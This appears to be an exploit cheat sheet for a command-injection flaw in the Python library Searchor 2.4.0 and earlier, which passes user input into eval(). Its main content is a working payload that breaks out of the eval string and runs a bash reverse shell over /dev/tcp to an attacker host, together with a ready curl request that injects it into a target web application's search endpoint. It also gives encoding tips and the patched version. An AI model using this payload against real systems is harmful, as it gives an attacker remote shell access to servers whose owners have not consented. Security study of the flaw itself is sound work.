# Searchor Command Injection

Searchor <= 2.4.0 uses `eval()` to construct search URLs. User-controlled input passed to the `search` command is injected into the eval expression, allowing arbitrary Python code execution.

## Exploit

```bash
# Payload injected into search query parameter
# The eval context: eval(f"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})")

# Reverse shell payload (inject into query field)
',__import__('os').system('bash -c "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"'))#

# Full curl example against web app using Searchor
curl -X POST "http://<TARGET>/search" \
  -d "engine=Google&query=',__import__('os').system('bash -c \"bash -i >& /dev/tcp/<LHOST>/4444 0>&1\"'))#"
```

## Notes
- Affected version: Searchor <= 2.4.0 (patched in 2.4.2 by removing eval)
- The injection closes the string, calls os.system(), and comments out the rest
- URL-encode the payload when submitting via browser/form
- Check for `searchor` in pip packages or application requirements: `pip show searchor`
